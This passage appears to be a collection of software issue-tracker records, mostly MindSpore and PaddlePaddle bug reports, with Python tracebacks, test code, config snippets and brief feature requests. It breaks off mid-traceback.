softmax_cross_entropy_with_logits_comp ute param_name_input2=""input_labels"") File ""/home/wangyixian/.pyenv/versions/tf2.x/lib/python3.7/site-packages/te/utils/shape_util.py"", line 85, in broadcast_shapes return broadcast_shapes(shape1, shape2, op_name, param_name_input1, param_name_input2) File ""/home/wangyixian/.pyenv/versions/tf2.x/lib/python3.7/site-packages/tbe/common/utils/shape_util.py"", line 246, in broadcast_shapes return pre_static_broadcast_shapes(shape1, shape2, op_name) File ""/home/wangyixian/.pyenv/versions/tf2.x/lib/python3.7/site-packages/tbe/common/utils/shape_util.py"", line 231, in pre_static_broadcast_shapes error_info['input1_shape'], error_info['input2_shape'])) RuntimeError: ({'errCode': 'E80013', 'op_name': 'softmax_cross_entropy_with_logits', 'input1_name': 'input_features', 'input2_name': 'input_labels', 'input1_shape': '696,211', 'input 2_shape': '694,211'}, 'In op[softmax_cross_entropy_with_logits], the inputs[input_features][input_labels] could not be broadcast together with shapes[696,211][694,211].')"
An error message is displayed indicating that the IP address does not exist in some test_forward cases,": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_forward_value_and_grad_046_int test_forward_value_and_grad_046_int_tensor test_forward_value_and_grad_047_int[False-False-False] test_forward_value_and_grad_047_int[False-True-False] test_forward_value_and_grad_047_int[True-False-False] test_forward_value_and_grad_047_int[True-True-False] test_forward_value_and_grad_047_int_tensor[False-False-False] test_forward_value_and_grad_047_int_tensor[False-True-False] test_forward_value_and_grad_047_int_tensor[True-False-False] test_forward_value_and_grad_047_int_tensor[True-True-False] pytest -s /interface/forwardvalueandgrad/test_forward_value_and_grad03.py 报错地址不存在 pass   <code>: @Author(""lwx692698"") @Level2 @AR('https://e.gitee.com/mind_spore/dashboard?issue=I2P7F3') @SKIP_ENV_CPU(reason='cpu忙職聜盲赂聧忙聰炉忙聦聛switch layer') @pytest.mark.parametrize(""sens_param"", [False]) @pytest.mark.parametrize(""get_by_list"", [False, True]) @pytest.mark.parametrize(""get_all"", [False, True]) def test_forward_value_and_grad_047_int_tensor(get_all, get_by_list, sens_param): class Net(nn.Cell, MetaFactory): def __init__(self, in_channel, out_channel): super().__init__() MetaFactory.__init__(self) self.fc = nn.Dense(in_channels=out_channel, out_channels=out_channel, weight_init='ones', bias_init='zeros', has_bias=True) self.bn = nn.BatchNorm2d(num_features=in_channel, gamma_init='ones', beta_init='zeros') self.funcs = (self.fc, self.bn) def construct(self, x, y): x = self.funcs[y](x) z = x * 2 return x, z class NetPytorch(nn_pt.Module): def __init__(self, in_channel, out_channel): super().__init__() self.fc = nn_pt.Linear(in_features=out_channel, out_features=out_channel) weight = torch.from_numpy(np.ones((out_channel, out_channel)).astype(np.float32)) bias = torch.from_numpy(np.zeros(out_channel).astype(np.float32)) self.fc.register_parameter('weight', torch.nn.Parameter(weight)) self.fc.register_parameter('bias', torch.nn.Parameter(bias)) weight2 = torch.from_numpy(np.ones(in_channel).astype(np.float32)) bias2 = torch.from_numpy(np.zeros(in_channel).astype(np.float32)) self.bn = nn_pt.BatchNorm2d(num_features=in_channel) self.bn.register_parameter('weight', torch.nn.Parameter(weight2)) self.bn.register_parameter('bias', torch.nn.Parameter(bias2)) self.funcs = (self.fc, self.bn) def forward(self, x, y): x = self.funcs[y](x) z = x * 2 return x, z net_me = Net(2, 4) net_me.set_train() net_torch = NetPytorch(2, 4) net_torch.train() fact = GradFactory(net_me=net_me, net_torch=net_torch, get_all=get_all, get_by_list=get_by_list, sens_param=sens_param, net_params=ParameterTuple(net_me.trainable_params())) input_1 = Tensor(np.random.randn(1, 2, 3, 4).astype(np.float32)) first_input2 = (input_1, Tensor(0, ms.int32)) second_input2 = (input_1, Tensor(1, ms.int32)) &gt; fact.one_backnet_call_twice(first_input2, second_input2) ../interface/forwardvalueandgrad/test_forward_value_and_grad03.py:478: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../interface/forwardvalueandgrad/test_forward_value_and_grad.py:164: in one_backnet_call_twice ms_out = back_net(*first_ms_input) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:404: in __call__ out = self.compile_and_run(*inputs) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:682: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:669: in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff83b6ac10&gt; obj = ForwardValueAndGrad&lt; (network): Net&lt; (fc): Dense&lt;input_channels=4, output_channels=4, has_bias=True&gt; (bn): B...=False), moving_variance=Parameter (name=bn.moving_variance, shape=(2,), dtype=Float32, requires_grad=False)&gt; &gt; &gt; phase = 'train.1633976223903639808.281472363259856.33', do_convert = True auto_parallel_mode = False args = (Tensor(shape=[1, 2, 3, 4], dtype=Float32, value= [[[[ 1.31753159e+00, -1.05484784e+00, 9.72523987e-01, -3.00868607e+..., [ 5.08207619e-01, -5.42852342e-01, 1.20661247e+00, 1.78008223e+00]]]]), Tensor(shape=[], dtype=Int32, value= 0)) def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" args_names, args_list = _generate_pip_args(obj, *args) dic = dict(zip(args_names, args_list)) key = generate_arguments_key(dic) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in self.compile_cache.keys(): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) is_sink_mode = args and isinstance(args[0], Tensor) and args[0].virtual_flag if auto_parallel_mode and _need_to_full() and not is_sink_mode and obj.auto_parallel_compile_and_run(): args_full = _to_full_tensor(args, _get_device_num(), _get_global_rank()) _, args_list = _generate_pip_args(obj, *args_full) enable_debug_runtime = context.get_context(""enable_debug_runtime"") enable_ge = context.get_context(""enable_ge"") use_vm = not enable_ge or (enable_debug_runtime and context.get_context(""mode"") == context.PYNATIVE_MODE) &gt; result = self._graph_executor.compile(obj, args_list, phase, use_vm, self.queue_name) E RuntimeError: mindspore/ccsrc/backend/session/anf_runtime_algorithm.cc:1071 GetMutableOutputAddr] Output_idx0 of node kernel_graph_256:芒聳露bn.moving_mean output addr is not exist trace: E In file /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/layer/normalization.py(227)/ self.moving_mean,/ E In file /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/layer/normalization.py(227)/ self.moving_mean,/ E In file /home/jenkins-slave/workspace/ME_Excutor_Featrue_Daily_EulerOS_A_K_Server_OpenSource/MindSporeTest/interface/forwardvalueandgrad/test_forward_value_and_grad03.py(439)/ x = self.funcs[y](x)/ E In file /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py(277)/ grads = self.grad(self.network, self.weights)(*grad_inputs)/ E E E # In file /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/getitem_impl.py(88) E return F.tuple_getitem(data, number_index) E ^ /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/api.py:542: RuntimeError"
Op重构后目前的 gradient check 出错输出信息太简陋,"实现 Op 时难免出现梯度检查不过的情况，发现目前 Gradient Check 的输出信息还是过于简陋，下面是出错信息。 可以输出更多信息，比如：一共多少维度，多少维度有diff，多少维度没有diff，diff值有多少。方便对整体出错情况有一个判断。   <code>: .F ====================================================================== FAIL: test_check_output (__main__.TestSoftmaxWithCrossEntropyOp) ---------------------------------------------------------------------- Traceback (most recent call last): File ""test_softmax_with_cross_entropy_op.py"", line 33, in test_check_output self.check_output() File ""/home/caoying/paddle_codes/paddle_github/python/paddle/v2/framework/tests/op_test.py"", line 207, in check_output self.check_output_with_place(place) File ""/home/caoying/paddle_codes/paddle_github/python/paddle/v2/framework/tests/op_test.py"", line 200, in check_output_with_place ""output name: "" + out_name + "" has diff."") AssertionError: output name: Loss has diff."
PaddlePredictor开启显存优化影响预测结果,"使用的版本的paddle_inference包（nightly-build, 版本信息： AnalysisConfig部分代码： 模型结构已经上传： model.tar.gz   <code>: GIT COMMIT ID: 2c5c6365144a1bc9f36be2af53758c391b321f84 WITH_MKL: ON WITH_MKLDNN: ON WITH_GPU: ON CUDA version: 9.0 CUDNN version: v7 paddle::AnalysisConfig config; config.SetModel(FLAGS_model_dir); config.EnableUseGpu(100, 0); config.SwitchSpecifyInputNames(true); config.EnableCUDNN(); config.SwitchIrOptim(true); config.EnableMemoryOptim(); auto predictor = CreatePaddlePredictor(config);"
租户过滤条提供 tenantSkip TTL 工具,环境信息 pigx版本: 4.4 是否修改包名: 否 提供详细   <code>: // 强制设置当前mapper 操作 不进行租户过滤 TenantContextHolder.setTenantSkip() mapper.操作
ImportError: libmklml_intel.so: cannot open shared object file: No such file or directory,"Just tried our latest production docker image, and got this error. I think we need to include the generated and into the Python package (or link into paddle statically). ...   <code>: libmklml_intel.so libiomp5.so Traceback (most recent call last): File ""go/pserver/client/c/test/test_train.py"", line 77, in &lt;module&gt; main() File ""go/pserver/client/c/test/test_train.py"", line 15, in main paddle.init(use_gpu=False, trainer_count=1) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/__init__.py"", line 66, in init import py_paddle.swig_paddle as api File ""/usr/local/lib/python2.7/dist-packages/py_paddle/__init__.py"", line 15, in &lt;module&gt; from util import DataProviderWrapperConverter File ""/usr/local/lib/python2.7/dist-packages/py_paddle/util.py"", line 18, in &lt;module&gt; import swig_paddle File ""/usr/local/lib/python2.7/dist-packages/py_paddle/swig_paddle.py"", line 28, in &lt;module&gt; _swig_paddle = swig_import_helper() File ""/usr/local/lib/python2.7/dist-packages/py_paddle/swig_paddle.py"", line 24, in swig_import_helper _mod = imp.load_module('_swig_paddle', fp, pathname, description) ImportError: libmklml_intel.so: cannot open shared object file: No such file or directory ImportError: libiomp5.so: cannot open shared object file: No such file or directory"
建议pom-biz-service-server.xml加上模块,"建议在pom-biz-service-server.xml添加iBase4J-SYS-Facade模块,要不然执行 clean package -P build tomcat7:run-war-only -f pom-biz-service-server.xml 就会报 修改前 修改后   <code>: &lt;modules&gt; &lt;module&gt;iBase4J-Common&lt;/module&gt; &lt;module&gt;iBase4J-Biz-Facade&lt;/module&gt; &lt;module&gt;iBase4J-Biz-Service&lt;/module&gt; &lt;/modules&gt; &lt;modules&gt; &lt;module&gt;iBase4J-Common&lt;/module&gt; &lt;module&gt;iBase4J-SYS-Facade&lt;/module&gt; &lt;module&gt;iBase4J-Biz-Facade&lt;/module&gt; &lt;module&gt;iBase4J-Biz-Service&lt;/module&gt; &lt;/modules&gt;"
ModelTrait.php中edit方法永远返回true,"$model中的update方法返回的是对象，所以false !== object() 返回true 调用modeltrait中的edit方法   <code>: public static function edit($data,$id,$field = null) { $model = new self; if(!$field) $field = $model-&gt;getPk(); return false !== $model-&gt;update($data,[$field=&gt;$id]); }"
在非微服务情况下聚合文档，配置分组的host会被截断http://,由于目前项目非微服务，但是依然需要聚合文档。 没有网关做统一入口，所以多个分组的请求地址都不一样， 例如: A服务为localhost:8080 B服务为localhost:9090 如下图所示，配置了当前组的host为 请问这个如何修改，才可以不截断http://呢。 另：尝试修改过pathMapping，但是也不理想，第一会有斜杠的转义问题，第二会自动追加一个/在最前面   <code>: http://locathost:9090
Feature/change op creation,"use as operator creation method. Fix #3198:怎样把训练好的模型打包成一个api工具，而不暴露模型配置和源码文件？   <code>: Operator(""fc"", X=""x"", W='w1', B='b1')"
多卡训练保存模型问题,"PaddlePaddle 2.0.2 Python 在PaddlePaddle 2.0之后多卡训练输出的是多次。是不是说每个GPU都是单独训练的？他们的模型参数会实时同步吗？如果我需要在每一轮结束后保存模型，需要过滤掉其他的GPU执行吗？例如这：   <code>: if dist.get_rank() == 0: save_model(args, model, optimizer)"
[MS][NET][CTPN][ascend910] Dataset processing failed,": /device ascend : -- MindSpore version :commit_id:8a51311e57 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:http://10.90.67.50/productrepo/HiAI/HISI_C79/20210909 test_ms_ctpn_perf_1p_0001.py test_ms_deeptext_icdar_perf.py get code from model_zoo sh run_standalone_train_ascend.sh network dataset processing failed network train success ctpn、deeptext网络在ascend910环境数据处理失败   <code>: [ERROR] MD(41438,fffd91ffb1e0,python):2021-09-13-03:41:57.606.313 [mindspore/ccsrc/minddata/dataset/util/task.cc:67] operator()] Task: MapOp(ID:8) - thread(281464541262304) is terminated with err msg: Exception thrown from PyFunc. map operation: [PyFunc] failed. The corresponding data files: /home/workspace/mindspore_dataset//ICDAR-SCUT-FORU-CocoText-SVT/ctpn_final_dataset/pretrain/ctpn_pretrain.mindrecord0. Error description: TypeError: Caught TypeError in map(or batch) worker and execute python function. Original Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/transforms/py_transforms_util.py"", line 157, in __call__ result = self.transform(*args) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/ctpn/network/test_ms_ctpn_perf_1p_0001/train/src/dataset.py"", line 285, in &lt;lambda&gt; compose_map_func = (lambda image, annotation: preprocess_fn(image, annotation, is_training)) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/ctpn/network/test_ms_ctpn_perf_1p_0001/train/src/dataset.py"", line 268, in preprocess_fn return _data_aug(image, box, is_training) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/ctpn/network/test_ms_ctpn_perf_1p_0001/train/src/dataset.py"", line 258, in _data_aug input_data = photo_crop_column(*input_data) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/ctpn/network/test_ms_ctpn_perf_1p_0001/train/src/dataset.py"", line 185, in photo_crop_column img_data, gt_bboxes, gt_label = random_photo(img, gt_bboxes, gt_label) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/ctpn/network/test_ms_ctpn_perf_1p_0001/train/src/dataset.py"", line 53, in __call__ img = cv2.cvtColor((img, getattr(cv2, f'COLOR_BGR2HSV'))) TypeError: cvtColor() missing required argument 'code' (pos 2) During handling of the above exception, another exception occurred: Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/engine/datasets.py"", line 2498, in _pyfunc_worker_exec r = _GLOBAL_PYFUNC_LIST[index](*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/transforms/py_transforms_util.py"", line 160, in __call__ result.reraise() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/core/py_util_helpers.py"", line 62, in reraise raise self.except_type(err_msg) TypeError: Caught TypeError in map(or batch) worker and execute python function. Original Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/transforms/py_transforms_util.py"", line 157, in __call__ result = self.transform(*args) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/ctpn/network/test_ms_ctpn_perf_1p_0001/train/src/dataset.py"", line 285, in &lt;lambda&gt; compose_map_func = (lambda image, annotation: preprocess_fn(image, annotation, is_training)) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/ctpn/network/test_ms_ctpn_perf_1p_0001/train/src/dataset.py"", line 268, in preprocess_fn return _data_aug(image, box, is_training) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/ctpn/network/test_ms_ctpn_perf_1p_0001/train/src/dataset.py"", line 258, in _data_aug input_data = photo_crop_column(*input_data) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/ctpn/network/test_ms_ctpn_perf_1p_0001/train/src/dataset.py"", line 185, in photo_crop_column img_data, gt_bboxes, gt_label = random_photo(img, gt_bboxes, gt_label) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/ctpn/network/test_ms_ctpn_perf_1p_0001/train/src/dataset.py"", line 53, in __call__ img = cv2.cvtColor((img, getattr(cv2, f'COLOR_BGR2HSV'))) TypeError: cvtColor() missing required argument 'code' (pos 2) At: /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/core/py_util_helpers.py(62): reraise /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/engine/datasets.py(2580): __call__"
LogHandler注解,"通过LogHandler注解设置自定义日志处理器   <code>: @Get(url = ""http://localhost:8080/send"") @LogHandler(com.your.company.logging.MyLogHandler.class) String send(@Query(""msg"") String message);"
[ST][MS][NET][lstm-crf][910 1p]FPS[206] can not reach 212,"lstm-crf网络在910环境1p训练，性能206/fps达不到212 / 硬件环境: /device ascend : -- MindSpore version :r1.9 commit_id:c915f9ed -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220901 MindSpore 版本：编译时间20220904181546 r1.9.0 commit_id:c915f9ed (/): /mode pynative /mode graph test_ms_lstm_crf_conll2000_glove_train_infer_910_1p_0001.py cd solution_test/cases/02network/02nlp/lstm/train pytest -s test_ms_lstm_crf_conll2000_glove_train_infer_910_1p_0001.py 网络训练成功，训练性能能达到212/fps 走给安正气   <code>: Train epoch time: 243430.003 ms, per step time: 545.807 ms Train epoch time: 43162.278 ms, per step time: 96.776 ms Train epoch time: 43439.122 ms, per step time: 97.397 ms Train epoch time: 43114.681 ms, per step time: 96.670 ms Train epoch time: 43116.902 ms, per step time: 96.675 ms Train epoch time: 43118.353 ms, per step time: 96.678 ms Train epoch time: 43104.639 ms, per step time: 96.647 ms Train epoch time: 43104.259 ms, per step time: 96.646 ms Train epoch time: 43102.040 ms, per step time: 96.641 ms Train epoch time: 43104.454 ms, per step time: 96.647 ms Train epoch time: 43106.131 ms, per step time: 96.651 ms Train epoch time: 43110.528 ms, per step time: 96.660 ms Train epoch time: 43105.474 ms, per step time: 96.649 ms Train epoch time: 43104.625 ms, per step time: 96.647 ms Train epoch time: 43111.489 ms, per step time: 96.663 ms Train epoch time: 43105.029 ms, per step time: 96.648 ms Train epoch time: 43107.092 ms, per step time: 96.653 ms Train epoch time: 43107.240 ms, per step time: 96.653 ms Train epoch time: 43107.878 ms, per step time: 96.654 ms Train epoch time: 43106.140 ms, per step time: 96.651 ms"
Fix the way Paddle reference ccache program,"It is a bug in CMake files. If we found ccache by CMAKE, we should use ${CCACHE_PATH} to reference it, not just use to reference it. It will make compile error, when is not in PATH variable but founded by .   <code>: ccache ccache cmake"
有接口可以调用模板进行打印吗,版本号： 积木报表是一款免费报表产品，功能免费源码不开放;   <code>: v1.4.0 您好，我想请问一下，你们报表有接口调用模板进行打印吗？
金额转大写问题,"JDK版本： openjdk_8_201 hutool版本： 5.7.20   <code>: String zero=""陆万柒仟伍佰伍拾陆元叁角贰分""; Convert.chineseToNumber(zero)"
fixed build issue of double definition of atomicAdd on modern GPUs,"Nvidia has implemented function in their CUDA utility, this PR can fix the build issue of duplicated definition of this function when building on modern GPUs equipped with the latest version of CUDA.   <code>: atomicAdd"
移植问题-TEE相关,"现在的内核中有一个宏用于开关TEE相关的操作 <em>LOSCFG_TEE_ENABLE</em> 但是这个宏所涉及的汇编指令不是所有芯片都支持 我在stm32mp157上启动内核时，调用到这个语句会报错。 看样子这部分的操作并不是通用的，是否需要解耦？   <code>: #ifndef LOSCFG_TEE_ENABLE MRC p15, 0, r0, c1, c1, 2 ORR r0, r0, #0xC00 BIC r0, r0, #0xC000 MCR p15, 0, r0, c1, c1, 2 LDR r0, =(0xF &lt;&lt; 20) MCR p15, 0, r0, c1, c0, 2 ISB #endif"
[CT][MS][Rad2Deg ] Rad2Deg has some problems at ascend and cpu、gpu,"1，还请确认，CPU、GPU环境是否支持float64？ 2，float16数据类型，在三种环境两种模式下，都无精度问题。   <code>: def test_rad2deg_input_dtype_float64_1d(): input_list = [] x0 = Tensor(np.random.randn(27, ).astype(np.float64)) input_list.append(x0) fact = Rad2DegMock(inputs=input_list) &gt; fact.forward_cmp() test_f_rad2deg.py:196: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/rad2deg_ops.py:58: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/primitive/rad2deg_ops.py:49: in forward_mindspore_impl output = net(self.input_x) ../share/utils.py:185: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:573: in __call__ out = self.compile_and_run(*args) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:952: in compile_and_run self.compile(*inputs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:925: in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/common/api.py:1076: in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:575: in __infer__ out[track] = fn(*(x[track] for x in args)) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:738: in infer_value return fn(*args) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/ops/function/math_func.py:2143: in _check_input_dtype validator.check_type_name(param_name, input_dtype, allow_dtypes, cls_name) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/_checkparam.py:625: in check_type_name raise_error_msg() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ def raise_error_msg(): """"""func for raising error message when check failed"""""" type_names = [t.__name__ if hasattr(t, '__name__') else t for t in valid_types] num_types = len(valid_types) msg_prefix = f""For '{prim_name}', the"" if prim_name else ""The"" &gt; raise TypeError(f""{msg_prefix} '{arg_name}' should be {'one of ' if num_types &gt; 1 else ''}"" f""{type_names if num_types &gt; 1 else type_names[0]}, "" f""but got {arg_type.__name__ if hasattr(arg_type, '__name__') else repr(arg_type)}."") E TypeError: The 'x' should be one of [mindspore.float16, mindspore.float32], but got mindspore.float64. def test_rad2deg_input_dtype_float16_7d(): input_list = [] x0 = Tensor(np.random.randn(6, 9, 9, 3, 9, 7, 6).astype(np.float16)) input_list.append(x0) fact = Rad2DegMock(inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() test_f_rad2deg.py:613: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/rad2deg_ops.py:92: in grad_cmp allclose_nparray(input_out_torch, input_out_mindspore, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[[[[-8.7875e+01, 9.5898e-01, -2.7188e+01, -3.7844e+01, -7.5273e+00, 1.8094e+01], [... [ 5.2156e+01, -3.3281e+01, -4.2031e+01, 6.8688e+01, 8.8312e+01, 8.4688e+01]]]]]]], dtype=float16) data_me = array([[[[[[[-8.7875e+01, 9.5947e-01, -2.7203e+01, -3.7844e+01, -7.5273e+00, 1.8094e+01], [... [ 5.2156e+01, -3.3312e+01, -4.2031e+01, 6.8750e+01, 8.8312e+01, 8.4750e+01]]]]]]], dtype=float16) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[ 27.7 50.1 -100.2 ... -95.9 29.6 55.72] E data_me_error:[ 27.73 50.16 -100.3 ... -96. 29.62 55.78] E loss:[0.03125 0.0625 0.125 ... 0.125 0.03125 0.0625 ] def test_rad2deg_input_dtype_float16_6d(): input_list = [] x0 = Tensor(np.random.randn(5, 2, 2, 2, 3, 4).astype(np.float16)) input_list.append(x0) fact = Rad2DegMock(inputs=input_list) &gt; fact.forward_cmp() test_f_rad2deg.py:540: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/rad2deg_ops.py:60: in forward_cmp allclose_nparray(out_pytorch, out_mindspore, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[[[ 6.3828e+00, -2.8484e+01, -2.1172e+01, 3.4902e+00], [ 4.7266e+00, -6.6875e+01, 8.0250e+01, 1..., -4.7188e+01, 2.0984e+01], [ 8.0500e+01, -7.9883e+00, 1.1806e+02, -3.7656e+01]]]]]], dtype=float16) data_me = array([[[[[[ 6.3828e+00, -2.8500e+01, -2.1172e+01, 3.4902e+00], [ 4.7305e+00, -6.6875e+01, 8.0250e+01, 1..., -4.7219e+01, 2.1000e+01], [ 8.0562e+01, -7.9883e+00, 1.1812e+02, -3.7656e+01]]]]]], dtype=float16) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[-60.25] E data_me_error:[-60.3] E loss:[0.0625] def test_rad2deg_input_dtype_float16_4d(): input_list = [] x0 = Tensor(np.random.randn(6, 1, 7, 4).astype(np.float16)) input_list.append(x0) fact = Rad2DegMock(inputs=input_list) &gt; fact.forward_cmp() test_f_rad2deg.py:382: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/rad2deg_ops.py:60: in forward_cmp allclose_nparray(out_pytorch, out_mindspore, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[-6.1250e+00, -4.3906e+00, 1.3430e+01, -8.9766e+00], [-7.9180e+00, -3.6781e+01, 9.0625e+01, 6.660...e-01, -6.9438e+01, 3.9312e+01], [-4.4531e+01, -9.9938e+01, 3.5188e+01, -2.1844e+01]]]], dtype=float16) data_me = array([[[[-6.1289e+00, -4.3906e+00, 1.3430e+01, -8.9844e+00], [-7.9219e+00, -3.6781e+01, 9.0688e+01, 6.660...e-01, -6.9438e+01, 3.9312e+01], [-4.4531e+01, -1.0000e+02, 3.5219e+01, -2.1844e+01]]]], dtype=float16) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = 